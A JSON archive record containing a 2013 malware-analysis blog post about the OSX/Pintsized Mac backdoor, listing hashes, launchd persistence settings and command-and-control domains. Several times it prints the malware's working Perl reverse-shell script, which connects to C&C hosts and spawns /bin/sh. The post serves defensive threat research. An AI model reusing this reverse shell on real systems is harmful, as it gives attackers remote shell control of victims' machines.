{
    "id": "74f2d286-044f-4f6c-938e-8da4faf39bb3",
    "created_at": "2023-01-12T15:02:50.97915Z",
    "updated_at": "2025-03-27T02:05:27.530057Z",
    "deleted_at": null,
    "sha1_hash": "3fc75c4c6d0e7b7e5c4789b981aaf27e1a7a2515",
    "title": "2013-03-24 - OSX-Pintsized Backdoor Additional Details",
    "authors": "",
    "file_creation_date": "2022-05-28T18:27:09Z",
    "file_modification_date": "2022-05-28T18:27:09Z",
    "file_size": 159063,
    "plain_text": "# OSX/Pintsized Backdoor Additional Details\n\n**[eromang.zataz.com/2013/03/24/osx-pintsized-backdoor-additional-details/](https://eromang.zataz.com/2013/03/24/osx-pintsized-backdoor-additional-details/)**\n\nwow 24/03/2013\n\nIn complement to my blog post regarding, you will find here under some additional\ninformations regarding OSX/Pintsized, the backdoor used to in these attacks.\n\n[OSX/Pintsized backdoor was initially described by Intego, the 19 February, with some](https://www.intego.com/mac-security-blog/pint-sized-backdoor-for-os-x-discovered/)\ndetails. At the time of Intego post, all of the C&C components were sinkholed to\n**[Shadowserver. The backdoor was composed of clear text reverse shell perl scripts,](https://shadowserver.org/wiki/)**\nexecuted a regular interval, and by a forked version of OpenSSH named “cupsd“. A RSA key\nwas embedded in the forked OpenSSH, reported domain name of C&C was “corp-aapl.com”\nand reported file names were:\n\ncom.apple.cocoa.plist\ncupsd (Mach-O binary)\ncom.apple.cupsd.plist\ncom.apple.cups.plist\ncom.apple.env.plist\n\n**[F-Secure also reported, the 19 February, some additional C&C servers “cloudbox-](http://www.f-secure.com/weblog/archives/00002505.html)**\n_storage.com” and “digitalinsight-ltd.com“._ **[Symantec reported some additional details on the](https://www.symantec.com/security_response/writeup.jsp?docid=2013-022017-1613-99&tabid=2)**\nC&C domain names “cache.cloudbox-storage.com“, “img.digitalinsight-ltd.com” and\n“pop.digitalinsight-ltd.com“, and also reported the storage location of the forked version of\nOpenSSH “/Users/[USER NAME]/.cups/cupsd“.\n\nBy doing an analysis of OSX/Pintsized I can provide the following additional informations:\n\n[All files, targeting OSX, were controlled by launchd daemon through launchd.plist](https://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man8/launchd.8.html)\nconfiguration files. Here under the list of all known launchd configuration files.\n\n[7fe4149b82516ae43938de6b8316ed84](https://www.virustotal.com/en/file/3b829abe42252b2fa8d304b93a35090c23f3702ad048adfdd03942f77e0f5a66/analysis/)\n\n**First seen: 2013-02-19 / Label: com.apple.cupsd / RunAtLoad: true / StartInterval: 900 /**\n**C&C: corp-aapl.com:8443**\n\nExecute “/Users/[USER NAME]/.cups/cupsd -z corp-aapl.com -P 8443”\n\n**[2e35b9a683ccc2408fef5ca575abf0e6](https://www.virustotal.com/en/file/62cac21ff3d2745a4b83770950b07b959d11fb4c4828eac14680c001824a1a68/analysis/)**\n\n**First seen: 2013-02-19 / Label: com.apple.cupsd / RunAtLoad: true**\n/ StartInterval: 900 / C&C: corp-aapl.com:8443\n\nExecute “/Users/[USER NAME]/.cups/cupsd -z corp-aapl.com -P 8443”\n\n**[27f241 64303 4 2d1d94d3143 48 b9](https://www.virustotal.com/en/file/7ba90281a833f046069a64c3805bd29d92276177c6fb41e6a8966cf0b4f07b96/analysis/)**\n\n\n-----\n\n**First seen: 2013-02-19 / Label: com.apple.istore / RunAtLoad: true**\n/ StartInterval: 900 / C&C: cache.cloudbox-storage.com:443\n\nExecute the following script with /usr/bin/perl\n```\nuse Socket;\n$p=sockaddr_in(443,inet_aton(\"cache.cloudbox-storage.com\"));\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nconnect(S,$p);\nopen(STDIN,\">&S\");\nopen(STDOUT,\">&S\");\nopen(STDERR,\">&S\");\nexec(\"/bin/sh -i\");\n\n```\n[2b9b84f0612d6f9d7efb705dd7522f83](https://www.virustotal.com/en/file/837de378c6b95156a53f5536c0d982d247335a22e6bf5f146a6c3f4c84bc55bd/analysis/)\n\n**First seen: 2013-02-19 / Label: com.apple.env / RunAtLoad: true**\n/ StartInterval: 900 / C&C: cache.cloudbox-storage.com:443\n\nExecute the following script with /usr/bin/perl\n```\nuse Socket;\n$p=sockaddr_in(443,inet_aton(\"cache.cloudbox-storage.com\"));\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nconnect(S,$p);\nopen(STDIN,\">&S\");\nopen(STDOUT,\">&S\");\nopen(STDERR,\">&S\");\nexec(\"/bin/sh -i\");\n\n```\n[34cee92669e0c60a9dbafae7319f49db](https://www.virustotal.com/en/file/490d6a45bd7e5ee265373f46fd00e98ff2eb854c0ceda024aa3adaefd947202f/analysis/)\n\n**First seen: 2013-02-19 / Label: com.apple.env / RunAtLoad: true**\n/ StartInterval: 900 / C&C: img.digitalinsight-ltd.com:443\n\nExecute the following script with /usr/bin/perl\n```\nuse Socket;\n$p=sockaddr_in(443,inet_aton(\"img.digitalinsight-ltd.com\"));\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nconnect(S,$p);\nopen(STDIN,\">&S\");\nopen(STDOUT,\">&S\");\nopen(STDERR,\">&S\");\nexec(\"/bin/sh -i\");\n\n```\n[d3f151b246deb74890c612606c6ad044](https://www.virustotal.com/en/file/e8b8e23c1991eefb06d1b1c7f96d5044d7ba8c93f76dad7329762ea00bc19898/analysis/)\n\n**First seen: 2013-02-19 / Label: com.apple.env / RunAtLoad: true**\n/ StartInterval: 900 / C&C: pop.digitalinsight-ltd.com:443\n\nExecute the following script with /usr/bin/perl\n\n\n-----\n\n```\nuse Socket;\n$h=\"pop.digitalinsight-ltd.com \";\n$h=~s/\\s+$//;\n$p=sockaddr_in(443,inet_aton($h));\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nconnect(S,$p);\nopen(STDIN,\">&S\");\nopen(STDOUT,\">&S\");\nopen(STDERR,\">&S\");\nexec(\"/bin/sh -i\");\n\n```\n[f419dfb35a0d220c4c53c4a087c91d5e](https://www.virustotal.com/en/file/2869d87a9d9abf7fbe3613e4a2520151358f3dcbad3f308e522fbf207fd3eb4f/analysis/)\n\n**First seen: 2013-02-19 / Label: com.apple.env / RunAtLoad: true**\n/ StartInterval: 900 / C&C: pop.digitalinsight-ltd.com:443\n\nExecute the following script with /usr/bin/perl\n```\nuse Socket;\n$p=sockaddr_in(443,inet_aton(\"pop.digitalinsight-ltd.com\"));\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nconnect(S,$p);\nopen(STDIN,\">&S\");\nopen(STDOUT,\">&S\");\nopen(STDERR,\">&S\");\nexec(\"/bin/sh -i\");\n\n```\n[59424d4a567ae809f96afc56d22892b2](https://www.virustotal.com/en/file/b4274c7496f27dade23e8515deb519417e34d684a15d4c29c36047825a8446e6/analysis/)\n\n**First seen: 2013-02-19 / Label: com.apple.env / RunAtLoad: true / StartInterval: 999**\n/ C&C: img.digitalinsight-ltd.com:443\n\nExecute the following script with /usr/bin/perl\n```\nuse Socket;\n$p=sockaddr_in(443,inet_aton(\"img.digitalinsight-ltd.com\"));\nsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\nconnect(S,$p);\nopen(STDIN,\">&S\");\nopen(STDOUT,\">&S\");\nopen(STDERR,\">&S\");\nexec(\"/bin/sh -i\");\n\n```\nHere under all binary files, aka “/Users/[USER NAME]/.cups/cupsd” or “/usr/sbin/muxd“.\n\n[0ec55685affc322a5d7be2e9ca1f9cbf](https://www.virustotal.com/en/file/8f5d8748a66e7b54aeaafc1b65b974db31fe8403c9d39b187fd54943c6d97d98/analysis/)\n\n**First seen: 2013-01-31 / CPU Architecture: 64 bit**\n\nFork of OpenSSH_6.0 with no logging, and “-P” and “-z” hidden command arguments.\n[“PuffySSH_5.8p1” string. 2048 bit embedded private key with associated public key.](https://pastebin.com/ZtgrAfg5)\n\n\n-----\n\n[3a861b8526e397b3684a99f363ec145b](https://www.virustotal.com/en/file/a610bb3396a2eb6186a135de5d0a5d29e16525fb7c069e853d0ce2bb90ca4921/analysis/)\n\n**First seen: 2013-02-20 / CPU Architecture: 64 bit**\n\nFork of OpenSSH_6.0p1 with no logging, and “-P” and “-z” hidden command arguments.\n[“PuffySSH_5.8p1” string. 2048 bit embedded private key with associated public key.](https://pastebin.com/ZtgrAfg5)\n\nHere under an additional binary caught when Microsoft also pointed the fact that they were\nvictim of this campaign.\n\n[1582d68144de2808b518934f0a02bfd6](https://www.virustotal.com/en/file/8ca7ed720babb32a6f381769ea00e16082a563704f8b672cb21cf11843f4da7a/analysis/)\n\n**First seen: 2013-01-22 / Internal name: javacpl.exe**\n\nOne additional file who was reported linked to the campaign:\n\n[622fc8b7daf425aed7f9ffa97e30c611](https://www.virustotal.com/en/file/09ae47e516d368ac1541f102e08b364f2e53c8fdfb5523a0cc6c1442969b6218/analysis/)\n\n**First seen: 2013-01-04 / Type: Java serialized data**\n\n[If you take a look at all the domain names sinkholed to Shadowserver, you will see](https://shadowserver.org/wiki/)\nadditional domain names.\n\n\n-----\n\n**Domain name: corp-appl.com – Creation Date: 05-mar-2012**\n\n**Domain name: cloudbox-storage.com – Creation Date: 07-dec-2012 – Sub-**\n**domains: cache.cloudbox-storage.com**\n\n**Domain name: digitalinsight-ltd.com – Creation Date: 22-mar-2012 – Sub-**\n**domains: ads.digitalinsight-ltd.com, img.digitalinsight-ltd.com, www.digitalinsight-ltd.com**\nand pop.digitalinsight-ltd.com\n\n**Domain name: clust12-akmai.net – Creation Date: 06-jun-2012 – Sub-domains:**\nfb.clust12-akmai.net and fbu.clust12-akmai.net\n\n\n-----\n\n**Domain name: jdk-update.com – Creation Date: 31-oct-2012 – Sub-domains: ww1.jdk-**\nupdate.com and www.jdk-update.com\n\n**Domain name: fbcbn.net – Creation Date: 09-oct-2012 – Sub-domains: ak.fbcbn.net and**\nstatic.ak.fbcbn.net\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2013/2013-03-24 - OSX-Pintsized Backdoor Additional Details.pdf"
    ],
    "report_names": [
        "2013-03-24 - OSX-Pintsized Backdoor Additional Details.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535770,
    "ts_updated_at": 1743041127,
    "ts_creation_date": 1653762429,
    "ts_modification_date": 1653762429,
    "files": {
        "pdf": "https://archive.orkl.eu/3fc75c4c6d0e7b7e5c4789b981aaf27e1a7a2515.pdf",
        "text": "https://archive.orkl.eu/3fc75c4c6d0e7b7e5c4789b981aaf27e1a7a2515.txt",
        "img": "https://archive.orkl.eu/3fc75c4c6d0e7b7e5c4789b981aaf27e1a7a2515.jpg"
    }
}